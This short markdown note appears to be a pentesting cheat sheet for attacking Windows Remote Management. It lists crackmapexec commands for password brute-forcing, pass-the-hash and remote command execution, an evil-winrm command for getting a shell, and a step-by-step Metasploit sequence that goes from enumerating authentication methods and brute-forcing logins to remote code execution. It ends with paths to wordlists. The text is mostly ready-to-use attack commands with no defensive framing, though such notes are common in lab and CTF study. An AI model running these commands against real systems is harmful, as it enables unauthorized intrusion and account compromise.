

# Exploiting WinRM 
-> windows remote management protocol
-> _5985 / 5986_ PORTs 
#winrm
###### Tools
-> _crackmapexec_ : to perform a brute-force
`crackmapexec winrm IP -u administrator -p /usr/pass_list.txt`
`crackmapexec winrm IP -u administrator -p PASSWORD -x "COMMAND"`
`crackmapexec winrm IP -u administrator -H password_hash(LM/NTML) -x "COMMAND"`

-> *evil_winrm* : ruby scrip to obtain a command shell.
`evil-winrm.rb -u USERNAME -p PASSWORD -i IP` : enjoy your shell.

##### steps to hack with MSF
1. first , check out the authentication methods supported by the  winRM on the target.
	-> `auxiliary/scanner/winrm/winrm_auth_methods`
2. If , _basic auth method_ is there then we can brute force it 
	-> `auxiliary/scanner/winrm/winrm_login`
3. After getting username and password , we can execute the commands 
	-> `auxiliary/scanner/winrm/winrm_cmd`
4. Module which provide _REMOTE CODE EXECUTION_
	-> `auxiliary/scanner/winrm/winrm_script_exec`
	-> Don't forgot to `set FORCE_VBS TRUE` , set it on true
5. Exploit Module For RCE
    -> `exploit/windows/winrm/winrm_script_exec`  (set Force_vbs true) 


##### Wordlist:
- Username
`/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- Password
`/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`